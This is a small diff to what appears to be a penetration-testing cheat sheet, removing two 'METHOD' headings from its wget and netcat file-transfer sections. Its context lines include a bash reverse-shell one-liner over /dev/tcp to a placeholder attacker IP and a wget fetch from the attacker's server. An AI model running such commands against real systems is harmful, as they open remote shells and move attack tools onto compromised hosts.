@@ -177,8 +177,6 @@ echo "[PASSWORD]" | su - [USER] -c "bas -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1"
 
 ### wget
 
-**METHOD ONE (`local server & wget`)**:
-
 **usecase**: fetch files/scripts from your local machine on the remote host
 
 _sender_:
@@ -195,8 +193,6 @@ wget http://[LOCAL IP]:8000/[FILE YOU WANT]
 ```
 
 ### netcat
-
-**METHOD TWO (netcat)**:
 
 ##### SENDING FILES BETWEEN SYSTEMS
 
